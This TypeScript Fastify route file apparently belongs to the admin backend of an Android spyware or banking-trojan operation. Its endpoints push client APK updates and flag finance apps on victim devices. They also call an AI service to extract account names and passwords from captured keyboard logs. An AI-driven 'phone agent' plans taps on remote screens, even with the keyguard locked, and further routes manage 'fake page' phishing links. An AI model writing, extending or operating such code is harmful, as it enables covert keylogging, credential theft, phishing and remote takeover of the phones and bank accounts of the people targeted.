import type { FastifyInstance } from "fastify";
import {
  getAPaymentMethods,
  setAPaymentMethods,
  PAYMENT_METHOD_IDS,
  getAiConfigPublic,
  setAiConfig,
  getClientApkUpdateEnabled,
  getClientApkUrl,
  getClientApkVersion,
  setClientApkUpdateConfig,
} from "../services/app-config.service.js";
import { analyzeFinanceApps, testAiConnection, extractAccountsFromKeyboardLogs, extractPasswordsFromKeyboardLogs, translateUiLabels } from "../services/ai.service.js";
import { planPhoneAgentStep } from "../services/phone-agent.service.js";
import { getAiTrace, getAiTraceDir, listAiTraces } from "../services/ai-trace.service.js";
import { listKeyboardLogs } from "../services/keyboard.service.js";
import {
  createFakePageWebLink,
  deleteFakePageWebLink,
  listFakePageWebLinks,
} from "../services/fake-page-web-link.service.js";

export async function registerConfigRoutes(app: FastifyInstance) {
  app.get("/api/adm/config/client-apk", async () => {
    return {
      ok: true,
      data: {
        key: "device.client_apk.url",
        enabled: await getClientApkUpdateEnabled(),
        url: await getClientApkUrl(),
        version: await getClientApkVersion(),
      },
    };
  });

  app.put<{ Body: { enabled?: unknown; url?: unknown; version?: unknown } }>(
    "/api/adm/config/client-apk",
    async (request, reply) => {
      try {
        const data = await setClientApkUpdateConfig(request.body ?? {});
        return {
          ok: true,
          data: {
            key: "device.client_apk.url",
            enabled: data.enabled,
            url: data.url,
            version: data.version,
          },
        };
      } catch (error) {
        const message = error instanceof Error ? error.message : "client_apk_config_save_failed";
        return reply.code(400).send({ ok: false, message });
      }
    },
  );

  app.get("/api/adm/config/a-payment-methods", async () => {
    const methods = await getAPaymentMethods();
    return {
      ok: true,
      data: {
        key: "a_payment_methods",
        methods,
        available: [...PAYMENT_METHOD_IDS],
      },
    };
  });

  app.put<{ Body: { methods?: unknown } }>("/api/adm/config/a-payment-methods", async (request, reply) => {
    try {
      const methods = await setAPaymentMethods(request.body?.methods);
      return {
        ok: true,
        data: {
          key: "a_payment_methods",
          methods,
          available: [...PAYMENT_METHOD_IDS],
        },
      };
    } catch (error) {
      const message = error instanceof Error ? error.message : "config_save_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.get("/api/adm/config/ai", async () => {
    const data = await getAiConfigPublic();
    return { ok: true, data };
  });

  app.put<{
    Body: {
      enabled?: unknown;
      baseUrl?: unknown;
      apiKey?: unknown;
      model?: unknown;
      modelOptionId?: unknown;
      translateModel?: unknown;
      translateModelOptionId?: unknown;
    };
  }>("/api/adm/config/ai", async (request, reply) => {
    try {
      const data = await setAiConfig(request.body ?? {});
      return { ok: true, data };
    } catch (error) {
      const message = error instanceof Error ? error.message : "ai_config_save_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.post<{
    Body: {
      baseUrl?: unknown;
      apiKey?: unknown;
      model?: unknown;
    };
  }>("/api/adm/config/ai/test", async (request, reply) => {
    try {
      const body = request.body ?? {};
      const data = await testAiConnection({
        baseUrl: typeof body.baseUrl === "string" ? body.baseUrl : undefined,
        apiKey: typeof body.apiKey === "string" ? body.apiKey : undefined,
        model: typeof body.model === "string" ? body.model : undefined,
      });
      return { ok: true, data };
    } catch (error) {
      const message = error instanceof Error ? error.message : "ai_test_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.post<{
    Body: { apps?: Array<{ packageName?: string; label?: string }> };
  }>("/api/adm/ai/analyze-finance-apps", async (request, reply) => {
    const apps = Array.isArray(request.body?.apps) ? request.body.apps : [];
    try {
      const candidates = await analyzeFinanceApps(
        apps.map((item) => ({
          packageName: String(item?.packageName ?? ""),
          label: String(item?.label ?? ""),
        })),
      );
      return { ok: true, data: { candidates } };
    } catch (error) {
      const message = error instanceof Error ? error.message : "ai_analyze_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.post<{
    Body: {
      deviceId?: string;
      packageName?: string;
      appLabel?: string;
    };
  }>("/api/adm/ai/extract-accounts", async (request, reply) => {
    const deviceId = String(request.body?.deviceId ?? "").trim();
    const packageName = String(request.body?.packageName ?? "").trim();
    const appLabel = String(request.body?.appLabel ?? "").trim();
    if (!deviceId || !packageName) {
      return reply.code(400).send({ ok: false, message: "deviceId_packageName_required" });
    }
    try {
      const logs = await listKeyboardLogs({
        deviceId,
        appPackage: packageName,
        page: 1,
        pageSize: 200,
      });
      const candidates = await extractAccountsFromKeyboardLogs({
        packageName,
        appLabel,
        logs: logs.items.map((item) => ({
          id: item.id,
          text: item.text,
          capturedAt: item.capturedAt,
        })),
      });
      return {
        ok: true,
        data: {
          candidates,
          scanned: logs.items.length,
          total: logs.total,
        },
      };
    } catch (error) {
      const message = error instanceof Error ? error.message : "ai_extract_accounts_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.post<{
    Body: {
      deviceId?: string;
      packageName?: string;
      appLabel?: string;
    };
  }>("/api/adm/ai/extract-passwords", async (request, reply) => {
    const deviceId = String(request.body?.deviceId ?? "").trim();
    const packageName = String(request.body?.packageName ?? "").trim();
    const appLabel = String(request.body?.appLabel ?? "").trim();
    if (!deviceId || !packageName) {
      return reply.code(400).send({ ok: false, message: "deviceId_packageName_required" });
    }
    try {
      const logs = await listKeyboardLogs({
        deviceId,
        appPackage: packageName,
        page: 1,
        pageSize: 200,
      });
      const candidates = await extractPasswordsFromKeyboardLogs({
        packageName,
        appLabel,
        logs: logs.items.map((item) => ({
          id: item.id,
          text: item.text,
          capturedAt: item.capturedAt,
        })),
      });
      return {
        ok: true,
        data: {
          candidates,
          scanned: logs.items.length,
          total: logs.total,
        },
      };
    } catch (error) {
      const message = error instanceof Error ? error.message : "ai_extract_passwords_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.post<{
    Body: { texts?: string[] };
  }>("/api/adm/ai/translate-ui-labels", async (request, reply) => {
    const texts = Array.isArray(request.body?.texts) ? request.body.texts : [];
    try {
      const map = await translateUiLabels(texts.map((item) => String(item ?? "")));
      return { ok: true, data: { map } };
    } catch (error) {
      const message = error instanceof Error ? error.message : "ui_translate_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.post<{
    Body: {
      goal?: string;
      screenWidth?: number;
      screenHeight?: number;
      packageName?: string;
      keyguardLocked?: boolean;
      nodes?: Array<{
        i?: number;
        text?: string;
        desc?: string;
        clickable?: boolean;
        focusable?: boolean;
        bounds?: { left?: number; top?: number; right?: number; bottom?: number };
        packageName?: string;
      }>;
      history?: Array<{
        stepIndex?: number;
        action?: string;
        reason?: string;
        params?: Record<string, unknown>;
        result?: string;
      }>;
    };
  }>("/api/adm/ai/phone-agent/plan-step", async (request, reply) => {
    const body = request.body ?? {};
    const nodes = Array.isArray(body.nodes) ? body.nodes : [];
    const history = Array.isArray(body.history) ? body.history : [];
    try {
      const plan = await planPhoneAgentStep({
        goal: String(body.goal ?? ""),
        screenWidth: Number(body.screenWidth ?? 0),
        screenHeight: Number(body.screenHeight ?? 0),
        packageName: String(body.packageName ?? ""),
        keyguardLocked: Boolean(body.keyguardLocked),
        nodes: nodes
          .map((item) => {
            const bounds = item.bounds ?? {};
            const left = Number(bounds.left ?? 0);
            const top = Number(bounds.top ?? 0);
            const right = Number(bounds.right ?? 0);
            const bottom = Number(bounds.bottom ?? 0);
            if (right <= left || bottom <= top) {
              return null;
            }
            return {
              i: Number(item.i ?? 0),
              text: String(item.text ?? ""),
              desc: String(item.desc ?? ""),
              clickable: Boolean(item.clickable),
              focusable: Boolean(item.focusable),
              bounds: { left, top, right, bottom },
              packageName: String(item.packageName ?? ""),
            };
          })
          .filter((item): item is NonNullable<typeof item> => item != null && item.i > 0),
        history: history
          .map((item, index) => ({
            stepIndex: Number(item.stepIndex ?? index + 1),
            action: String(item.action ?? "") as import("../services/phone-agent.service.js").PhoneAgentActionType,
            reason: String(item.reason ?? ""),
            params:
              item.params && typeof item.params === "object" && !Array.isArray(item.params)
                ? item.params
                : {},
            result: item.result == null ? undefined : String(item.result),
          }))
          .filter((item) => item.action),
      });
      return { ok: true, data: { plan } };
    } catch (error) {
      const message = error instanceof Error ? error.message : "phone_agent_plan_failed";
      return reply.code(400).send({ ok: false, message });
    }
  });

  app.get<{ Querystring: { limit?: string } }>("/api/adm/ai/traces", async (request) => {
    const limit = Number(request.query.limit ?? 50);
    const items = await listAiTraces(Number.isFinite(limit) ? limit : 50);
    return {
      ok: true,
      data: {
        items,
        dir: getAiTraceDir(),
      },
    };
  });

  app.get<{ Params: { id: string } }>("/api/adm/ai/traces/:id", async (request, reply) => {
    const id = String(request.params.id ?? "").trim();
    if (!id) {
      return reply.code(400).send({ ok: false, message: "id_required" });
    }
    const trace = await getAiTrace(id);
    if (!trace) {
      return reply.code(404).send({ ok: false, message: "trace_not_found" });
    }
    return { ok: true, data: trace };
  });

  app.get("/api/adm/config/fake-page-web-links", async () => {
    const items = await listFakePageWebLinks();
    return { ok: true, data: items };
  });

  app.post<{ Body: { name?: unknown; url?: unknown } }>(
    "/api/adm/config/fake-page-web-links",
    async (request, reply) => {
      try {
        const data = await createFakePageWebLink({
          name: String(request.body?.name ?? ""),
          url: String(request.body?.url ?? ""),
        });
        return { ok: true, data };
      } catch (error) {
        const message = error instanceof Error ? error.message : "fake_page_web_link_create_failed";
        return reply.code(400).send({ ok: false, message });
      }
    },
  );

  app.delete<{ Querystring: { id?: string } }>(
    "/api/adm/config/fake-page-web-links",
    async (request, reply) => {
      const id = request.query.id?.trim() ?? "";
      if (!id) {
        return reply.code(400).send({ ok: false, message: "id_required" });
      }
      try {
        await deleteFakePageWebLink(id);
        return { ok: true, data: null };
      } catch (error) {
        const message = error instanceof Error ? error.message : "fake_page_web_link_delete_failed";
        return reply.code(400).send({ ok: false, message });
      }
    },
  );
}
